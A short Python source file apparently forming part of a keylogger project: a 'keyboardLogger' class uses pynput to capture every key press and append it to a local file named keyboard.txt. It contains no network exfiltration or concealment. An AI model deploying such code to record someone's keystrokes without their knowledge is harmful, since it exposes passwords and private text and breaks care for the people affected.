from pynput.keyboard import Key, Listener
from createFile import createFile

class keyboardLogger():

    def on_press(self, key):
        createFile().writeInFile(format(key).replace("\'", ""), "keyboard.txt")
    
    def createKeyboardListener(self):
        with Listener(on_press=keyboardLogger().on_press) as listener:
            listener.join()
        
        